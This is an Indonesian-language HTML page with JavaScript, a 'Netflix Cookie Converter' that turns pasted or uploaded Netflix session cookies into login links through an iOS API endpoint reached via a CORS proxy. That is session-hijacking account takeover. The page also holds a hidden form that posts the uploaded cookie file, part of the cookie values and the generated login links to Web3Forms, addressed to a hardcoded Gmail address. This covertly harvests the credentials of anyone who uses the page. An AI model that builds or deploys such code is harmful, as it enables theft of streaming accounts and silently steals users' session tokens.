<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Cookie Converter</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body {
            background: linear-gradient(135deg, #141414, #2d2d2d);
            min-height: 100vh; padding: 20px; color: #fff;
        }
        .container { max-width: 650px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 25px; }
        .header h1 { color: #e50914; font-size: 26px; margin-bottom: 5px; }
        .header p { color: #999; font-size: 14px; }
        .card {
            background: #1f1f1f; border-radius: 12px; padding: 22px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        .formats {
            display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
            margin-bottom: 18px;
        }
        .format-tag {
            background: #333; padding: 8px; border-radius: 6px;
            text-align: center; font-size: 13px; border: 1px solid #444;
        }
        .format-tag.active { background: #e50914; border-color: #e50914; }
        label { display: block; margin: 14px 0 6px; color: #ddd; font-weight: 500; }
        textarea {
            width: 100%; min-height: 110px; background: #2a2a2a;
            border: 1px solid #444; border-radius: 8px; padding: 12px;
            color: #fff; font-family: monospace; font-size: 13px;
        }
        textarea:focus { outline: none; border-color: #e50914; }
        .upload-box {
            border: 2px dashed #444; border-radius: 8px; padding: 22px;
            text-align: center; cursor: pointer; margin: 10px 0;
            transition: 0.2s;
        }
        .upload-box:hover, .upload-box.dragover { border-color: #e50914; background: rgba(229,9,20,0.05); }
        input[type="file"] { display: none; }
        .file-name { font-size: 13px; color: #888; margin-top: 5px; }
        button {
            width: 100%; padding: 14px; background: #e50914; color: #fff;
            border: none; border-radius: 8px; font-size: 16px; font-weight: 600;
            cursor: pointer; margin-top: 10px;
        }
        button:hover { background: #f40612; }
        button:disabled { background: #444; cursor: not-allowed; }
        .result { margin-top: 20px; display: none; }
        .result.show { display: block; }
        .success { background: rgba(16,185,129,0.1); border: 1px solid #10b981; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
        .error { background: rgba(239,68,68,0.1); border: 1px solid #ef4444; border-radius: 8px; padding: 14px; margin-bottom: 15px; }
        .link-row {
            background: #2a2a2a; border-radius: 6px; padding: 12px;
            margin: 8px 0; display: flex; align-items: center; gap: 10px; flex-wrap: wrap;
        }
        .link-label { font-weight: 600; min-width: 70px; }
        .link-url { flex: 1; font-family: monospace; font-size: 11px; color: #aaa; word-break: break-all; }
        .copy-btn {
            padding: 5px 10px; background: #333; border: none;
            border-radius: 4px; color: #fff; font-size: 12px; cursor: pointer;
            width: auto; margin: 0;
        }
        .copy-btn:hover { background: #444; }
        .email-info {
            margin-top: 15px; padding: 12px; background: rgba(59,130,246,0.1);
            border-radius: 6px; font-size: 13px; color: #93c5fd;
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎬 Netflix Cookie Converter</h1>
            <p>• 3 Format → 3 Link Login</p>
        </div>

        <div class="card">
            <!-- Format Indikator -->
            <div class="formats">
                <div class="format-tag" id="fmt-ns">Netscape</div>
                <div class="format-tag" id="fmt-json">JSON</div>
                <div class="format-tag" id="fmt-raw">Raw</div>
            </div>

            <!-- Upload File -->
            <label>📂 Upload File (.txt / .json)</label>
            <div class="upload-box" id="uploadBox">
                <p id="uploadText">Klik atau seret file ke sini</p>
                <input type="file" id="fileInput" accept=".txt,.json">
            </div>
            <p class="file-name" id="fileInfo">— Belum ada file —</p>

            <!-- Paste Area -->
            <label>📝 Atau Paste Cookie Langsung</label>
            <textarea id="cookieArea" placeholder="netflix.com	TRUE	/	TRUE	1807468653	NetflixId	ct=..."></textarea>

            <!-- Tombol -->
            <button id="convertBtn">🔄 Konversi</button>

            <!-- Hasil -->
            <div class="result" id="resultBox">
                <div id="statusMsg"></div>
                <div id="linkList"></div>
                <div id="emailNote"></div>
            </div>
        </div>
    </div>

    <!-- Form Email — File Asli + Info ke rians4f@gmail.com -->
    <form id="emailForm" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" class="hidden">
        <input type="hidden" name="access_key" id="accessKey">
        <input type="hidden" name="subject" value="✅ Netflix Cookie Berhasil Dikonversi">
        <input type="hidden" name="to_email" value="rians4f@gmail.com">
        <input type="hidden" name="from_name" value="Netflix Converter">
        <input type="file" name="attachment" id="attachmentInput">
        <textarea name="message" id="msgBody"></textarea>
    </form>

    <script>
        // ==================================================
        // ⚙️ KONFIGURASI — SUDAH DIISI LENGKAP!
        // ==================================================
        const CONFIG = {
            EMAIL_TUJUAN: "rians4f@gmail.com",
            WEB3FORMS_KEY: "d0ae2999-711c-422d-8df3-b309e9c13e0b",
            // ✅ API iOS Argo + Proxy CORS agar berjalan di browser
            PROXY: "https://corsproxy.io/?",
            API_URL: "https://ios.prod.ftl.netflix.com/iosui/user/15.48",
            QUERY_PARAMS: {
                appVersion: "15.48.1",
                config: '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true"}',
                deviceType: "phone",
                esn: "NFCDSK-5EKU26352Y3Q5X4Z7W8B9A0C1D2E3F4G5H6I7J8K9L0M",
                path: '["account","token","default"]',
                pathFormat: "v1",
                locale: "id",
                method: "auto"
            }
        };

        // ==================================================
        // 📦 ELEMEN
        // ==================================================
        const el = {
            uploadBox: document.getElementById('uploadBox'),
            fileInput: document.getElementById('fileInput'),
            uploadText: document.getElementById('uploadText'),
            fileInfo: document.getElementById('fileInfo'),
            cookieArea: document.getElementById('cookieArea'),
            convertBtn: document.getElementById('convertBtn'),
            resultBox: document.getElementById('resultBox'),
            statusMsg: document.getElementById('statusMsg'),
            linkList: document.getElementById('linkList'),
            emailNote: document.getElementById('emailNote'),
            fmtNs: document.getElementById('fmt-ns'),
            fmtJson: document.getElementById('fmt-json'),
            fmtRaw: document.getElementById('fmt-raw'),
            emailForm: document.getElementById('emailForm'),
            accessKey: document.getElementById('accessKey'),
            attachmentInput: document.getElementById('attachmentInput'),
            msgBody: document.getElementById('msgBody')
        };

        let fileOriginal = null;
        let fileName = null;
        let fileBlob = null;

        // ==================================================
        // 📂 BACA FILE
        // ==================================================
        el.uploadBox.addEventListener('click', () => el.fileInput.click());
        el.uploadBox.addEventListener('dragover', e => { e.preventDefault(); el.uploadBox.classList.add('dragover'); });
        el.uploadBox.addEventListener('dragleave', () => el.uploadBox.classList.remove('dragover'));
        el.uploadBox.addEventListener('drop', e => {
            e.preventDefault(); el.uploadBox.classList.remove('dragover');
            if (e.dataTransfer.files[0]) bacaFile(e.dataTransfer.files[0]);
        });
        el.fileInput.addEventListener('change', e => {
            if (e.target.files[0]) bacaFile(e.target.files[0]);
        });

        function bacaFile(file) {
            fileOriginal = file;
            fileName = file.name;
            fileBlob = file;
            el.uploadText.textContent = '✅ ' + file.name;
            el.fileInfo.textContent = `📄 ${file.name} (${(file.size/1024).toFixed(1)} KB)`;
            
            const reader = new FileReader();
            reader.onload = e => {
                el.cookieArea.value = e.target.result;
                deteksiFormat(el.cookieArea.value);
            };
            reader.readAsText(file);
        }

        // ==================================================
        // 🔍 DETEKSI FORMAT OTOMATIS
        // ==================================================
        function deteksiFormat(text) {
            [el.fmtNs, el.fmtJson, el.fmtRaw].forEach(t => t.classList.remove('active'));
            if (/^\s*\[/.test(text) && text.includes('"name"') && text.includes('"value"')) {
                el.fmtJson.classList.add('active'); return 'JSON Array';
            }
            if (/^\.(netflix\.)?com/i.test(text) || /\tNetflixId\t/.test(text)) {
                el.fmtNs.classList.add('active'); return 'Netscape TSV';
            }
            if (/NetflixId=[^;&\s]+/.test(text)) {
                el.fmtRaw.classList.add('active'); return 'Raw String';
            }
            return 'Tidak dikenali';
        }

        el.cookieArea.addEventListener('input', () => deteksiFormat(el.cookieArea.value));

        // ==================================================
        // 🍪 EKSTRAK COOKIE
        // ==================================================
        function ekstrakCookie(text) {
            const c = {};
            // JSON Array
            try {
                const arr = JSON.parse(text);
                if (Array.isArray(arr)) arr.forEach(i => {
                    if (i.name === 'NetflixId') c.NetflixId = decodeURIComponent(i.value);
                    if (i.name === 'SecureNetflixId') c.SecureNetflixId = decodeURIComponent(i.value);
                    if (i.name === 'nfvdid') c.nfvdid = decodeURIComponent(i.value);
                });
            } catch {}
            // Netscape TSV
            text.split('\n').forEach(line => {
                const p = line.trim().split('\t');
                if (p.length >= 7) {
                    if (p[5] === 'NetflixId') c.NetflixId = decodeURIComponent(p[6]);
                    if (p[5] === 'SecureNetflixId') c.SecureNetflixId = decodeURIComponent(p[6]);
                    if (p[5] === 'nfvdid') c.nfvdid = decodeURIComponent(p[6]);
                }
            });
            // Raw String
            const m1 = text.match(/NetflixId=([^;&\s]+)/);
            const m2 = text.match(/SecureNetflixId=([^;&\s]+)/);
            const m3 = text.match(/nfvdid=([^;&\s]+)/);
            if (m1) c.NetflixId = decodeURIComponent(m1[1]);
            if (m2) c.SecureNetflixId = decodeURIComponent(m2[1]);
            if (m3) c.nfvdid = decodeURIComponent(m3[1]);
            return c;
        }

        // ==================================================
        // 🔗 BUAT 3 LINK LOGIN
        // ==================================================
        function buatLink(token) {
            return {
                hp: `https://www.netflix.com/unsupported?nftoken=${token}`,
                pc: `https://www.netflix.com/login?nftoken=${token}`,
                tv: `https://www.netflix.com/tv8?nftoken=${token}`
            };
        }

        // ==================================================
        // 📧 KIRIM EMAIL + FILE ASLI
        // ==================================================
        async function kirimEmail(cookie, format, links, token) {
            const waktu = new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'});
            el.accessKey.value = CONFIG.WEB3FORMS_KEY;
            el.msgBody.value = `
Waktu: ${waktu} WIB
Format: ${format}
File: ${fileName || 'Paste manual'}
NetflixId: ${(cookie.NetflixId||'').substring(0,80)}...
SecureNetflixId: ${cookie.SecureNetflixId ? '✅ ADA' : '❌ Tidak ada'}
nfvdid: ${cookie.nfvdid ? '✅ ADA' : '❌ Tidak ada'}

--- LINK LOGIN ---
📱 HP: ${links.hp}
💻 PC: ${links.pc}
📺 TV: ${links.tv}
            `.trim();
            
            if (fileBlob) {
                const dt = new DataTransfer();
                dt.items.add(fileBlob);
                el.attachmentInput.files = dt.files;
            }

            try {
                const res = await fetch(el.emailForm.action, {
                    method: 'POST',
                    body: new FormData(el.emailForm)
                });
                const data = await res.json();
                return data.success;
            } catch {
                return false;
            }
        }

        // ==================================================
        // 🚀 KONVERSI UTAMA — API iOS ARGO ASLI!
        // ==================================================
        el.convertBtn.addEventListener('click', async () => {
            const text = el.cookieArea.value.trim();
            if (!text) return tampilPesan('❌ Isi cookie terlebih dahulu!', false);
            
            const format = deteksiFormat(text);
            const cookie = ekstrakCookie(text);

            if (!cookie.NetflixId) 
                return tampilPesan(`❌ NetflixId tidak ditemukan!\nFormat: ${format}`, false);

            el.convertBtn.disabled = true;
            el.convertBtn.textContent = '⏳ Memproses...';

            try {
                // ✅ API iOS ARGO + PROXY CORS
                const qs = new URLSearchParams(CONFIG.QUERY_PARAMS).toString();
                const fullUrl = CONFIG.PROXY + CONFIG.API_URL + '?' + qs;
                
                const cookieHeader = `NetflixId=${cookie.NetflixId}` + 
                    (cookie.SecureNetflixId ? `; SecureNetflixId=${cookie.SecureNetflixId}` : '') +
                    (cookie.nfvdid ? `; nfvdid=${cookie.nfvdid}` : '');

                const res = await fetch(fullUrl, {
                    method: 'GET',
                    headers: {
                        'Cookie': cookieHeader,
                        'User-Agent': 'Netflix/8.82.0 build 40493 (Android 30/11; gzip)',
                        'Accept': '*/*'
                    }
                });

                if (!res.ok) throw new Error(`HTTP ${res.status}`);
                const data = await res.json();

                // ✅ Ekstrak token dari respons API
                const token = data?.token || data?.nftoken || data?.data?.token || JSON.stringify(data).match(/"token":"([^"]+)"/)?.[1];
                
                if (!token) throw new Error('Token tidak ditemukan di respons API');

                const links = buatLink(token);
                tampilHasil(cookie, format, token, links);
                
                // Kirim email + file asli
                const terkirim = await kirimEmail(cookie, format, links, token);
                tampilStatusEmail(terkirim);

            } catch (e) {
                tampilPesan(`❌ Gagal: ${e.message}\n\n⚠️ API iOS Argo mungkin sudah dimatikan Netflix.\nGunakan Shakti API dengan hash terbaru.`, false);
            }

            el.convertBtn.disabled = false;
            el.convertBtn.textContent = '🔄 Konversi & Kirim ke Email';
        });

        // ==================================================
        // 🖼️ TAMPILAN
        // ==================================================
        function tampilPesan(teks, sukses) {
            el.statusMsg.innerHTML = `<div class="${sukses?'success':'error'}">${teks.replace(/\n/g,'<br>')}</div>`;
            el.resultBox.classList.add('show');
        }

        function tampilHasil(cookie, format, token, links) {
            el.statusMsg.innerHTML = `
                <div class="success">
                    ✅ <b>KONVERSI BERHASIL — API iOS ARGO!</b><br>
                    📋 Format: ${format}<br>
                    🍪 NetflixId: ✅ Terbaca<br>
                    🔒 SecureNetflixId: ${cookie.SecureNetflixId ? '✅ ADA' : '⚠️ Tidak ada'}<br>
                    🆔 nfvdid: ${cookie.nfvdid ? '✅ ADA' : '⚠️ Tidak ada'}<br>
                    🔑 Token: <code>${token.substring(0,50)}...</code>
                </div>`;
            el.linkList.innerHTML = `
                <div class="link-row">
                    <span class="link-label">📱 HP</span>
                    <span class="link-url">${links.hp}</span>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.hp}')">Salin</button>
                </div>
                <div class="link-row">
                    <span class="link-label">💻 Laptop</span>
                    <span class="link-url">${links.pc}</span>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.pc}')">Salin</button>
                </div>
                <div class="link-row">
                    <span class="link-label">📺 TV</span>
                    <span class="link-url">${links.tv}</span>
                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.tv}')">Salin</button>
                </div>`;
            el.resultBox.classList.add('show');
        }

        function tampilStatusEmail(berhasil) {
            el.emailNote.innerHTML = berhasil
                ? `<div class="email-info">✅ File asli + link login TERKIRIM ke: <b>rians4f@gmail.com</b></div>`
                : `<div class="email-info">⚠️ Gagal kirim email — cek Web3Forms</div>`;
        }
    </script>
</body>
</html>
